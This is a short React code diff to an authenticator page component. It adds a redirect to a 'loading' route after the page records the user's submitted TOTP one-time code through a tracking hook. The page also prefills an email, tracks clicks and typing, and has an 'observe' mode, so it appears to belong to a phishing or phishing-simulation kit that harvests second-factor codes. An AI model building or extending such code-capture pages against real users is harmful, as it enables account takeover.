@@ -152,7 +152,8 @@ ${GE_SHELL_CSS}
 `;
 
 function GeAuthenticatorPage() {
-  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
+  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
+    useGeTracking();
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [code, setCode] = useState("");
   const [focused, setFocused] = useState(false);
@@ -200,6 +201,7 @@ function GeAuthenticatorPage() {
     if (!canContinue) return;
     trackClick("Next");
     trackSubmit("totp", code.trim());
+    geNavigate("/ge/loading");
   };
 
   return (
